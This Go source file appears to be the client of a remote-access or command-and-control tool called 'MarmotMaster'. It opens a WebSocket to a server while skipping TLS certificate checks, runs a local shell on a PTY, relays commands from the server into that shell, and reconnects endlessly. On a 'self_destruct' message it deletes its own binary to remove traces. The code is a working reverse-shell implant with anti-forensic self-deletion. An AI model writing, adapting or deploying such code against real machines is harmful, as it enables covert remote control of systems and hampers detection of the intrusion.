package client

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"strings"
	"time"

	"github.com/gorilla/websocket"
)

// safeMarshal safely marshals a value to JSON, logging errors and returning nil on failure
func safeMarshal(v interface{}) []byte {
	data, err := json.Marshal(v)
	if err != nil {
		log.Printf("Error marshaling JSON: %v", err)
		return nil
	}
	return data
}

// Client represents a connection to the MarmotMaster server
type Client struct {
	conn      *websocket.Conn
	serverURL string
	clientID  string
	done      chan struct{}
	ptyMgr    *PTYManager
}

// NewClient creates a new client instance
func NewClient(serverURL, clientID string) *Client {
	c := &Client{
		serverURL: serverURL,
		clientID:  clientID,
		done:      make(chan struct{}),
	}
	c.ptyMgr = NewPTYManager(c)
	return c
}

// Connect establishes a WebSocket connection to the server
func (c *Client) Connect() error {
	url := fmt.Sprintf("%s/ws/client?id=%s", c.serverURL, c.clientID)

	// Configure WebSocket dialer to accept self-signed certificates
	dialer := websocket.DefaultDialer
	if strings.HasPrefix(c.serverURL, "wss://") {
		dialer.TLSClientConfig = &tls.Config{
			InsecureSkipVerify: true, // Accept self-signed certificates
		}
	}

	var err error
	c.conn, _, err = dialer.Dial(url, nil)
	if err != nil {
		return err
	}

	log.Printf("Connected to server: %s", c.serverURL)
	return nil
}

// Run starts the client's main event loop
func (c *Client) Run() {
	defer func() {
		// Cleanup PTY manager
		if c.ptyMgr != nil {
			c.ptyMgr.Cleanup()
		}
		// Close WebSocket connection
		if c.conn != nil {
			c.conn.Close()
		}
	}()

	// Start shell
	if err := c.ptyMgr.StartShell(); err != nil {
		log.Printf("Failed to start shell: %v", err)
		return
	}

	// Start persistent PTY output reader
	go c.ptyMgr.ReadOutput(c.conn)

	// Handle incoming messages
	for {
		_, message, err := c.conn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("WebSocket error: %v", err)
			}
			break
		}

		var msg Message
		if err := json.Unmarshal(message, &msg); err != nil {
			log.Printf("Error unmarshaling message: %v", err)
			continue
		}

		c.handleMessage(msg)
	}
}

// Reconnect attempts to reconnect to the server
func (c *Client) Reconnect() {
	for {
		time.Sleep(5 * time.Second)
		if err := c.Connect(); err != nil {
			log.Printf("Reconnection failed: %v. Retrying...", err)
			continue
		}
		c.Run()
	}
}

// SelfDestruct deletes the client binary and exits
func (c *Client) SelfDestruct() {
	log.Println("Self-destruct initiated...")

	// Get the path to the current executable
	execPath, err := os.Executable()
	if err != nil {
		log.Printf("Failed to get executable path: %v", err)
		os.Exit(1)
		return
	}

	// Resolve symlinks to get the actual file
	realPath, err := os.Readlink(execPath)
	if err == nil {
		execPath = realPath
	}

	log.Printf("Deleting binary: %s", execPath)

	// Cleanup PTY manager
	if c.ptyMgr != nil {
		c.ptyMgr.Cleanup()
	}

	// Close WebSocket connection
	if c.conn != nil {
		c.conn.Close()
	}

	// Give a brief moment for cleanup
	time.Sleep(100 * time.Millisecond)

	// Delete the binary file
	if err := os.Remove(execPath); err != nil {
		log.Printf("Failed to delete binary: %v", err)
		os.Exit(1)
		return
	}

	log.Println("Binary deleted. Exiting...")
	os.Exit(0)
}

// handleMessage processes incoming messages from the server
func (c *Client) handleMessage(msg Message) {
	switch msg.Type {
	case "terminal_input":
		var data []byte
		if msg.Binary {
			// Decode base64 to preserve all control sequences for TUI apps
			decoded, err := base64.StdEncoding.DecodeString(msg.Data)
			if err != nil {
				log.Printf("Error decoding base64 input: %v", err)
				return
			}
			data = decoded
		} else {
			// Plain text (legacy support)
			data = []byte(msg.Data)
		}

		// Write to PTY using manager
		if err := c.ptyMgr.WriteInput(data); err != nil {
			log.Printf("Error writing to PTY: %v", err)
		}

	case "terminal_resize":
		// Resize PTY using manager
		if err := c.ptyMgr.Resize(msg.Rows, msg.Cols); err != nil {
			log.Printf("Error resizing PTY: %v", err)
		}

	case "ping":
		// Respond to ping
		pong := Message{
			Type:      "pong",
			Timestamp: time.Now().Format(time.RFC3339),
		}
		pongJSON := safeMarshal(pong)
		if pongJSON == nil {
			return // Failed to marshal, skip response
		}
		if err := c.conn.WriteMessage(websocket.TextMessage, pongJSON); err != nil {
			log.Printf("Error sending pong response: %v", err)
		}

	case "execute_command":
		// Legacy command execution - convert to terminal input
		if msg.Command != "" {
			data := []byte(msg.Command + "\n")
			if err := c.ptyMgr.WriteInput(data); err != nil {
				log.Printf("Error executing command: %v", err)
			}
		}

	case "self_destruct":
		// Self-destruct: delete binary and exit
		go c.SelfDestruct()

	default:
		// Silently ignore unknown message types to reduce log noise
		if msg.Type != "command_result" {
			log.Printf("Unknown message type: %s", msg.Type)
		}
	}
}
